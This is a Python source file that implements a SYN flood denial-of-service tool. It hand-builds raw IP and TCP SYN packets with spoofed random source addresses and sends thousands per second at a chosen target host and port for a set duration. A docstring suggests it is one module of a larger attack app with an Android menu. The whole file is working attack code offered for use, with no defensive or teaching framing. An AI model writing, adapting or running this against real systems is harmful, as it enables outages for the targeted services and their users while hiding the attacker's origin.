"""
SYN flood — raw L3/L4. Requires root or CAP_NET_RAW.
On non-root Android the menu hides this because VpnService/tun is needed.
"""
import random
import socket
import struct
import time


def _checksum(data):
    s = 0
    if len(data) % 2:
        data += b"\x00"
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _build_syn(src_ip, dst_ip, src_port, dst_port, seq):
    ip_ihl_ver = (4 << 4) | 5
    ip_tos = 0
    ip_tot = 40
    ip_id = random.randint(0, 0xFFFF)
    ip_frag = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_src = socket.inet_aton(src_ip)
    ip_dst = socket.inet_aton(dst_ip)
    iphdr = struct.pack("!BBHHHBBH4s4s",
                        ip_ihl_ver, ip_tos, ip_tot, ip_id, ip_frag,
                        ip_ttl, ip_proto, ip_check, ip_src, ip_dst)
    ip_check = _checksum(iphdr)
    iphdr = struct.pack("!BBHHHBBH4s4s",
                        ip_ihl_ver, ip_tos, ip_tot, ip_id, ip_frag,
                        ip_ttl, ip_proto, ip_check, ip_src, ip_dst)
    tcp_off_flags = (5 << 12) | 0x002  # SYN
    tcphdr = struct.pack("!HHIIBBHHH",
                         src_port, dst_port, seq, 0, tcp_off_flags,
                         0xFFFF, 0, 0, 0)
    pseudo = ip_src + ip_dst + struct.pack("!BBH", 0, ip_proto, len(tcphdr))
    tcp_check = _checksum(pseudo + tcphdr)
    tcphdr = struct.pack("!HHIIBBHHH",
                         src_port, dst_port, seq, 0, tcp_off_flags,
                         0xFFFF, tcp_check, 0, 0)
    return iphdr + tcphdr


class SYNFlood:
    def __init__(self, dst_ip, dst_port=80, duration=30, rate=2000):
        self.dst = dst_ip
        self.port = dst_port
        self.duration = duration
        self.rate = rate
        self.sent = 0

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            raise RuntimeError("SYN needs root/CAP_NET_RAW — not available")
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        end = time.time() + self.duration
        while time.time() < end:
            for _ in range(self.rate):
                src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                pkt = _build_syn(src, self.dst,
                                 random.randint(1024, 65535), self.port,
                                 random.randint(0, 0xFFFFFFFF))
                try:
                    s.sendto(pkt, (self.dst, 0))
                    self.sent += 1
                except Exception:
                    pass
        s.close()
        return {"sent": self.sent}
